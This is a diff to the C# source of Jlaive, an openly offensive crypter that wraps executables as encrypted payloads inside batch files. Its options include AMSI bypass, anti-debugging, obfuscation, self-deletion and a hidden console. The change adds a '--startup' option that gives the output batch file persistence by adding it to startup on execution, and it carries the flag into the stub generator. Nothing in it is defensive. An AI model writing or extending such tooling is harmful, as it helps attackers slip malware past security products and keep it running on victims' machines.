@@ -20,6 +20,7 @@ namespace Jlaive
         static bool _obfuscate = false;
         static bool _deleteself = false;
         static bool _hidden = false;
+        static bool _startup = false;
 
         static void Main(string[] args)
         {
@@ -35,6 +36,7 @@ namespace Jlaive
                 else if (args[i] == "-obf" || args[i] == "--obfuscate") _obfuscate = true;
                 else if (args[i] == "-d" || args[i] == "--deleteself") _deleteself = true;
                 else if (args[i] == "-h" || args[i] == "--hidden") _hidden = true;
+                else if (args[i] == "-s" || args[i] == "--startup") _startup = true;
             }
 
             if (!File.Exists(_input))
@@ -58,7 +60,7 @@ namespace Jlaive
 
             Console.WriteLine("Creating .NET stub...");
             AesManaged aes = new AesManaged();
-            string stub = StubGen.CreateCS(aes.Key, aes.IV, _amsibypass, _antidebug, rng);
+            string stub = StubGen.CreateCS(aes.Key, aes.IV, _amsibypass, _antidebug, _startup, rng);
             string tempfile = Path.GetTempFileName();
             Console.WriteLine("Compiling stub...");
             File.WriteAllText("payload.txt", Convert.ToBase64String(Encrypt(Compress(pbytes), aes.Key, aes.IV)));
@@ -108,7 +110,7 @@ namespace Jlaive
             if (_obfuscate) output.Append(Obfuscator.GenCode(toobf.ToString(), rng, 1));
             else output.AppendLine(toobf.ToString());
             if (_deleteself) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
-            output.AppendLine("exit");
+            output.AppendLine("exit /b");
             output.Append(Convert.ToBase64String(encrypted));
 
             Console.WriteLine("Writing output...");
@@ -141,7 +143,7 @@ namespace Jlaive
             Console.ForegroundColor = ConsoleColor.White;
             Console.Write("Usage:");
             Console.ForegroundColor = ConsoleColor.Gray;
-            Console.Write($" {Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)} [-h|--help] [-i|--input] [-o|--output] [-ab|--amsibypass] [-ad|--antidebug] [-obf|--obfuscate] [-d|--deleteself] [-h|--hidden]\n\n");
+            Console.Write($" {Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName)} [-h|--help] [-i|--input] [-o|--output] [-ab|--amsibypass] [-ad|--antidebug] [-obf|--obfuscate] [-d|--deleteself] [-h|--hidden] [-s|--startup]\n\n");
 
             Console.ForegroundColor = ConsoleColor.White;
             Console.WriteLine("Arguments:");
@@ -154,6 +156,7 @@ namespace Jlaive
             Console.WriteLine("--obfuscate     Obfuscate output file");
             Console.WriteLine("--deleteself    Make output file delete itself after execution");
             Console.WriteLine("--hidden        Hide console during execution");
+            Console.WriteLine("--startup       Add batch file to startup upon execution");
             Console.WriteLine();
             Console.ResetColor();
             Environment.Exit(0);
